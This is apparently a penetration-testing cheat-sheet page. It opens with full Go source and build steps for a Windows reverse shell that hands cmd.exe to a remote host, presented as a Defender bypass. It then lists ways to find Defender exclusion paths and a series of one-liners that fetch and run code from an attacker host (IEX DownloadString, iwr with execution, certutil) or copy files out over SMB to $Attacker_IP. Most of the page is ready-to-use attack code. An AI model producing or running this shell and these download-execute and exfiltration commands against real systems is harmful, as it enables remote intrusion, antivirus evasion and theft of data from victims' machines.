---
# the default layout is 'page'
icon: fas fa-subway
order: 6
---
#  🖥️ Windows 10 Bypass With GO 
Video Explaination [here](https://youtu.be/zM8EVJdErsc?si=uGHzpHG8HMlHIfjZ)
### nano pleasesubscribe.go
```bash
package main
import ("os/exec"; "net"; "time")

func main() { 
        time.Sleep(2 * time.Second)
        c,_:= net.Dial("tcp", "192.168.x.x:443")
        cmd:= exec.Command("cmd")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run() 
}
```
### Compile it !
```bash
GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
```
# 💭💭 Defender Exclusion Path Detection
[John Hammand Video](https://youtu.be/fxO1V0mzePQ?si=DkA5820pjg2F47pV)
### Add Exclusion Path
```bash
# Need Admin Priv
Search virus  ---> open it ---> click on Virus & Threat Protection ( Manage setting ) ----> Go at the End of the page ---> See the Exclusion ====> Now you can add or remove Paths.
```
## For ADMIN User
```bash
(Get-MpPreference).ExclusionPath
```
## For Low Power User
```bash
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion*" } | Select-Object Message | FL
```
# 🐼 Get your Box IpAddress
## IPv4 Address
```bash
Get-NetIPAddress -AddressFamily IPv4 |findstr /i ipaddress
```
## IPv6 Address
```bash
Get-NetIPAddress -AddressFamily IPv6 |findstr /i ipaddress
```
### Get Internet Facing IPAddress
```bash
$pubIPv4 = Invoke-RestMethod -Uri "https://api.ipify.org"
$pubIPv6 = Invoke-RestMethod -Uri "https://api64.ipify.org"

Write-Output "Your Public IPv4 Address : $pubIPv4"
Write-Output "Your Public IPv6 Address : $pubIPv6"
```
### One linear
```bash
"Your IPv4 is: $(irm api.ipify.org)"; "Your IPv6 is: $(irm api64.ipify.org)"    # irm= invoke Rest Method 
```

#  🗃️ File Transfer
```bash
# 1. IEX DownloadString (Execute in memory)
IEX(New-Object Net.WebClient).DownloadString("http://$ip:$port/file")

# 2. curl (Windows 10+)
curl http://$ip:$port/file -o file

# 3. Invoke-WebRequest
powershell "iwr -Uri http://$ip:$port/file -OutFile C:\Windows\Temp\file"

# 4. NetExec (needs valid credentials)
nxc smb $ip -u '' -p '' --put-file file C:\Windows\Temp\file

# 5. PowerShell DownloadFile
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/file','C:\Temp\file')"

# 6. Short version (iwr + IEX)
IEX(iwr 'http://$ip:$port/file' -UseBasicParsing)

# 7. Certutil
certutil -urlcache -split -f http://$ip:$port/file file
certutil -urlcache * delete

# 8. wget (PowerShell alias)
wget "http://$ip:$port/file" -OutFile "C:\Windows\Temp\file"

# 9. smbserver
impacket-smbserver share ./ -smb2support -user 0xmr -pass ''
or 
smbserver.py share ./ -smb2support -user 0xmr -pass ''

##  Copy to windows
net use \\$Attacker_IP\share /user:0xmr
copy \\$Attacker_IP\share\file C:\Temp\file

##  copy from windows
net use \\$Attacker_IP\share /user:0xmr
copy file_name \\$Attacker_IP\share

# 10. Download and Execution Both
powershell "iwr -Uri http://${YOUR_KALI_IP_ADDRESS}:$port/file -OutFile C:/Windows/Tasks/file; C:/Windows/Tasks/file"

powershell -NoProfile -Command "$ip='$Attacker_IP'; iwr http://$ip:$port/file -OutFile $env:TEMP\file; Get-Content $env:TEMP\file"
```
